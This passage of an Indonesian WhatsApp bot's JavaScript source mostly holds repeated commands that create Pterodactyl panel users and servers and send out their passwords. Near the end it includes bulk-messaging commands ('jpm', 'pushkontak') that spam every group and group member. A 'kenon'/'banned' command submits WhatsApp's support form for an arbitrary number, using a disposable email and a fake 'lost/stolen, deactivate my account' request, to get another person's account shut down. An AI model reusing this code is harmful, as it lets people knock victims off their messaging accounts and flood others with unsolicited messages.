"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
}
})
let data = await f1.json();
let eggs = data.attributes

let f3 = await fetch(host + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key,
},
"body": JSON.stringify({
"name": name,
"description": "",
"user": parseInt(userId),
"egg": parseInt(eggId),
"docker_image": eggs.docker_image,
"startup": eggs.startup,
"environment": serverCreate.eggs.environment,
"limits": {
"memory": memory,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": serverCreate.limits.db,
"backups": serverCreate.limits.backups,
"allocations": serverCreate.limits.allocation
},
deploy: {
locations: [parseInt(locId)],
dedicated_ip: false,
port_range: [],
},
})
})
let rama = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ADD SERVER*\n\n*TYPE: server*\n\n*NAME:* ${rama.attributes.name}\n-----------------------------\n*ID:* ${rama.attributes.id}\n-----------------------------\n*IDENTIFIER:* ${rama.attributes.identifier}\n-----------------------------\n*UUID:* ${rama.attributes.uuid}\n-----------------------------\n*RAM:* ${rama.attributes.limits.memory === 0 ? 'UNLIMITED' : rama.attributes.limits.memory} MB\n-----------------------------\n*DISK:* ${rama.attributes.limits.disk === 0 ? 'UNLIMITED' : rama.attributes.limits.disk} MB\n-----------------------------\n*CPU:* ${rama.attributes.limits.cpu === 0 ? 'UNLIMITED' : rama.attributes.limits.cpu}%\n-----------------------------\n*TANGGAL* ${tanggal}`)
}
break
case '5gb':{
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
let s = q.split(',')
let username = s[0]
let nomor = s[1]
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let psswd = require("crypto").randomBytes(10).toString("hex").toUpperCase()
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(host + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": psswd
})
})
let res = await f.json();
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2));
ramz.sendMessage(from, { text: `*SUCCESSFULLY ADD USER*\n\n*TYPE:* user\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL* ${tanggal}\n\n*Password telah dikirim ke @${nomornya.split('@')[0]}*`, mentions: [nomornya]}, { quoted: msg })
ramz.sendMessage(nomornya, { text: `*DONE PANEL BY MiMiXd Solo*\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL:* ${tanggal}\n-----------------------------\n*PASSWORD:* ${psswd}\n-----------------------------\n*LOGIN:* ${host}\n\n*NOTE*\n_*Bot* atau *MiMiXd Solo* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })

let name = s[0] + `Js` 
let userId = `${res.attributes.id}`
let eggId = `${serverCreate.eggId}`
let locId = `1`
let memory = `5198`
let disk = `5198`
let cpu = `130`
let f1 = await fetch(host + "/api/application/nests/" + serverCreate.nestId + "/eggs/" + eggId, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
}
})
let data = await f1.json();
let eggs = data.attributes

let f3 = await fetch(host + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key,
},
"body": JSON.stringify({
"name": name,
"description": "",
"user": parseInt(userId),
"egg": parseInt(eggId),
"docker_image": eggs.docker_image,
"startup": eggs.startup,
"environment": serverCreate.eggs.environment,
"limits": {
"memory": memory,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": serverCreate.limits.db,
"backups": serverCreate.limits.backups,
"allocations": serverCreate.limits.allocation
},
deploy: {
locations: [parseInt(locId)],
dedicated_ip: false,
port_range: [],
},
})
})
let rama = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ADD SERVER*\n\n*TYPE: server*\n\n*NAME:* ${rama.attributes.name}\n-----------------------------\n*ID:* ${rama.attributes.id}\n-----------------------------\n*IDENTIFIER:* ${rama.attributes.identifier}\n-----------------------------\n*UUID:* ${rama.attributes.uuid}\n-----------------------------\n*RAM:* ${rama.attributes.limits.memory === 0 ? 'UNLIMITED' : rama.attributes.limits.memory} MB\n-----------------------------\n*DISK:* ${rama.attributes.limits.disk === 0 ? 'UNLIMITED' : rama.attributes.limits.disk} MB\n-----------------------------\n*CPU:* ${rama.attributes.limits.cpu === 0 ? 'UNLIMITED' : rama.attributes.limits.cpu}%\n-----------------------------\n*TANGGAL* ${tanggal}`)
}
break
case '6gb':{
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
let s = q.split(',')
let username = s[0]
let nomor = s[1]
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let psswd = require("crypto").randomBytes(10).toString("hex").toUpperCase()
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(host + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": psswd
})
})
let res = await f.json();
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2));
ramz.sendMessage(from, { text: `*SUCCESSFULLY ADD USER*\n\n*TYPE:* user\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL* ${tanggal}\n\n*Password telah dikirim ke @${nomornya.split('@')[0]}*`, mentions: [nomornya]}, { quoted: msg })
ramz.sendMessage(nomornya, { text: `*DONE PANEL BY MiMiXd Solo*\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL:* ${tanggal}\n-----------------------------\n*PASSWORD:* ${psswd}\n-----------------------------\n*LOGIN:* ${host}\n\n*NOTE*\n_*Bot* atau *MiMiXd Solo* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })

let name = s[0] + `Js` 
let userId = `${res.attributes.id}`
let eggId = `${serverCreate.eggId}`
let locId = `1`
let memory = `6198`
let disk = `6198`
let cpu = `155`
let f1 = await fetch(host + "/api/application/nests/" + serverCreate.nestId + "/eggs/" + eggId, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
}
})
let data = await f1.json();
let eggs = data.attributes

let f3 = await fetch(host + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key,
},
"body": JSON.stringify({
"name": name,
"description": "",
"user": parseInt(userId),
"egg": parseInt(eggId),
"docker_image": eggs.docker_image,
"startup": eggs.startup,
"environment": serverCreate.eggs.environment,
"limits": {
"memory": memory,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": serverCreate.limits.db,
"backups": serverCreate.limits.backups,
"allocations": serverCreate.limits.allocation
},
deploy: {
locations: [parseInt(locId)],
dedicated_ip: false,
port_range: [],
},
})
})
let rama = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ADD SERVER*\n\n*TYPE: server*\n\n*NAME:* ${rama.attributes.name}\n-----------------------------\n*ID:* ${rama.attributes.id}\n-----------------------------\n*IDENTIFIER:* ${rama.attributes.identifier}\n-----------------------------\n*UUID:* ${rama.attributes.uuid}\n-----------------------------\n*RAM:* ${rama.attributes.limits.memory === 0 ? 'UNLIMITED' : rama.attributes.limits.memory} MB\n-----------------------------\n*DISK:* ${rama.attributes.limits.disk === 0 ? 'UNLIMITED' : rama.attributes.limits.disk} MB\n-----------------------------\n*CPU:* ${rama.attributes.limits.cpu === 0 ? 'UNLIMITED' : rama.attributes.limits.cpu}%\n-----------------------------\n*TANGGAL* ${tanggal}`)
}
break
case '7gb':{
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
let s = q.split(',')
let username = s[0]
let nomor = s[1]
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let psswd = require("crypto").randomBytes(10).toString("hex").toUpperCase()
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(host + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": psswd
})
})
let res = await f.json();
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2));
ramz.sendMessage(from, { text: `*SUCCESSFULLY ADD USER*\n\n*TYPE:* user\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL* ${tanggal}\n\n*Password telah dikirim ke @${nomornya.split('@')[0]}*`, mentions: [nomornya]}, { quoted: msg })
ramz.sendMessage(nomornya, { text: `*DONE PANEL BY MiMiXd Solo*\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL:* ${tanggal}\n-----------------------------\n*PASSWORD:* ${psswd}\n-----------------------------\n*LOGIN:* ${host}\n\n*NOTE*\n_*Bot* atau *MiMiXd Solo* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })

let name = s[0] + `Js` 
let userId = `${res.attributes.id}`
let eggId = `${serverCreate.eggId}`
let locId = `1`
let memory = `7198`
let disk = `7198`
let cpu = `185`
let f1 = await fetch(host + "/api/application/nests/" + serverCreate.nestId + "/eggs/" + eggId, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
}
})
let data = await f1.json();
let eggs = data.attributes

let f3 = await fetch(host + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key,
},
"body": JSON.stringify({
"name": name,
"description": "",
"user": parseInt(userId),
"egg": parseInt(eggId),
"docker_image": eggs.docker_image,
"startup": eggs.startup,
"environment": serverCreate.eggs.environment,
"limits": {
"memory": memory,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": serverCreate.limits.db,
"backups": serverCreate.limits.backups,
"allocations": serverCreate.limits.allocation
},
deploy: {
locations: [parseInt(locId)],
dedicated_ip: false,
port_range: [],
},
})
})
let rama = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ADD SERVER*\n\n*TYPE: server*\n\n*NAME:* ${rama.attributes.name}\n-----------------------------\n*ID:* ${rama.attributes.id}\n-----------------------------\n*IDENTIFIER:* ${rama.attributes.identifier}\n-----------------------------\n*UUID:* ${rama.attributes.uuid}\n-----------------------------\n*RAM:* ${rama.attributes.limits.memory === 0 ? 'UNLIMITED' : rama.attributes.limits.memory} MB\n-----------------------------\n*DISK:* ${rama.attributes.limits.disk === 0 ? 'UNLIMITED' : rama.attributes.limits.disk} MB\n-----------------------------\n*CPU:* ${rama.attributes.limits.cpu === 0 ? 'UNLIMITED' : rama.attributes.limits.cpu}%\n-----------------------------\n*TANGGAL* ${tanggal}`)
}
break
case 'unlimited':
case 'unli':{
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
let s = q.split(',')
let username = s[0]
let nomor = s[1]
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let psswd = require("crypto").randomBytes(10).toString("hex").toUpperCase()
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(host + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": psswd
})
})
let res = await f.json();
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2));
ramz.sendMessage(from, { text: `*SUCCESSFULLY ADD USER*\n\n*TYPE:* user\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL* ${tanggal}\n\n*Password telah dikirim ke @${nomornya.split('@')[0]}*`, mentions: [nomornya]}, { quoted: msg })
ramz.sendMessage(nomornya, { text: `*DONE PANEL BY MiMiXd Solo*\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL:* ${tanggal}\n-----------------------------\n*PASSWORD:* ${psswd}\n-----------------------------\n*LOGIN:* ${host}\n\n*NOTE*\n_*Bot* atau *MiMiXd Solo* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })

let name = s[0] + `Js` 
let userId = `${res.attributes.id}`
let eggId = `${serverCreate.eggId}`
let locId = `1`
let memory = `0`
let disk = `0`
let cpu = `0`
let f1 = await fetch(host + "/api/application/nests/" + serverCreate.nestId + "/eggs/" + eggId, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
}
})
let data = await f1.json();
let eggs = data.attributes

let f3 = await fetch(host + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key,
},
"body": JSON.stringify({
"name": name,
"description": "",
"user": parseInt(userId),
"egg": parseInt(eggId),
"docker_image": eggs.docker_image,
"startup": eggs.startup,
"environment": serverCreate.eggs.environment,
"limits": {
"memory": memory,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": serverCreate.limits.db,
"backups": serverCreate.limits.backups,
"allocations": serverCreate.limits.allocation
},
deploy: {
locations: [parseInt(locId)],
dedicated_ip: false,
port_range: [],
},
})
})
let rama = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ADD SERVER*\n\n*TYPE: server*\n\n*NAME:* ${rama.attributes.name}\n-----------------------------\n*ID:* ${rama.attributes.id}\n-----------------------------\n*IDENTIFIER:* ${rama.attributes.identifier}\n-----------------------------\n*UUID:* ${rama.attributes.uuid}\n-----------------------------\n*RAM:* ${rama.attributes.limits.memory === 0 ? 'UNLIMITED' : rama.attributes.limits.memory} MB\n-----------------------------\n*DISK:* ${rama.attributes.limits.disk === 0 ? 'UNLIMITED' : rama.attributes.limits.disk} MB\n-----------------------------\n*CPU:* ${rama.attributes.limits.cpu === 0 ? 'UNLIMITED' : rama.attributes.limits.cpu}%\n-----------------------------\n*TANGGAL* ${tanggal}`)
}
break
case 'delakses':
if (!isOwner) return reply(`Lu bukan Owner😂`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62xxx`)
let ya = q.split("|")[0].replace(/[^0-9]/g, '')
let unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
reply(`Nomor ${ya} Sudah Di Hapus`)
break
case 'addakses':
if (!isOwner) return reply(`Lu bukan Owner😂`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62xxxx`)
let bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await ramz.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
reply(`Nomor ${bnnd} Sudah Di tambahkan!!!`)
break
case "pushmember":
case "jpm":{
             if (!isRama && !isOwner) return reply(`Lu bukan Owner ge kocak`)
             if (!q) return reply(`Gunakan:\n${prefix + command} Text nya`)
             let getGroups = await ramz.groupFetchAllParticipating();
             let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]);
             let anu = groups.map((v) => v.id);
             reply(`Terdeteksi ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`);
             for (let i of anu) {
             await sleep(5000);
             let txt = `${q}`;
             ramz.sendText(i, txt);
              }
              reply(`Suksess Jpm.. Minimal makasih🥱`);
              }
              break
case 'pushkontak': {
    if (!isRama && !isOwner) return reply(mess.OnlyOwner)
      if (!isGroup) return reply(`Khusus Group!!..`)
    if (!q) return reply(`Teks nya mana kak?`)
    let rama = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    reply(`Wait... Proses di jeda 5detik per-orang`)
    for (let pler of rama) {
    ramz.sendMessage(pler, { text: q})
    await sleep(5000)
     }  
     reply(`Succes Push Kontak`)
      }
      break
case 'kenon':
case 'banned': {
	if (!isOwner) return reply(mess.OnlyOwner)
   var axioss = require ("axios")
   if (!q) return reply(`Penggunaan *${prefix+command} 628xxx*`)
   var numNya = q.replace(/[^0-9]/g, '')
   let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
 let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
 let cookie = ntah.headers["set-cookie"].join("; ")
 let $ = cheerio.load(ntah.data)
 let $form = $("form");
 let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
 let form = new URLSearchParams()
 form.append("jazoest", $form.find("input[name=jazoest]").val())
 form.append("lsd", $form.find("input[name=lsd]").val())
 form.append("step", "submit")
 form.append("country_selector", "ID")
 form.append("phone_number", numNya)
 form.append("email", email.data[0])
 form.append("email_confirm", email.data[0])
 form.append("platform", "ANDROID")
 form.append("your_message", "Perdido/roubado: desative minha conta")
 form.append("__user", "0")
 form.append("__a", "1")
 form.append("__csr", "")
 form.append("__req", "8")
 form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
 form.append("dpr", "1")
 form.append("__ccg", "UNKNOWN")
 form.append("__rev", "1006630858")
 form.append("__comment_req", "0")
 let res = await axioss({
   url,
   method: "POST",
   data: form,
   headers: {
     cookie
   }
 })
 reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
 }
 break
default:
if ((budy) && ["assalamu'alaikum", "Assalamu'alaikum", "Assalamualaikum", "assalamualaikum", "Assalammualaikum", "assalammualaikum", "Asalamualaikum", "asalamualaikum", "Asalamu'alaikum", " asalamu'alaikum"].includes(budy) && !isCmd) {
ramz.sendMessage(from, { text: `${pickRandom(["Wa'alaikumussalam","Wa'alaikumussalam Wb.","Wa'alaikumussalam Wr. Wb.","Wa'alaikumussalam Warahmatullahi Wabarakatuh"])}`})
}


}} catch (err) {
console.log(color('[ERROR]', 'red'), err)
const isGroup = msg.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const moment = require("moment-timezone");
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const tanggal = moment().tz("Asia/Jakarta").format("ll")
let kon_erorr = {"tanggal": tanggal, "jam": jam, "error": err, "user": sender}
db_error.push(kon_erorr)
fs.writeFileSync('./database/error.json', JSON.stringify(db_error))
var errny =`*SERVER ERROR*
*Dari:* @${sender.split("@")[0]}
*Jam:* ${jam}
*Tanggal:* ${tanggal}
*Tercatat:* ${db_error.length}
*Type:* ${err}`
ramz.sendMessage(setting.ownerNumber, {text:errny, mentions:[sender]})
}}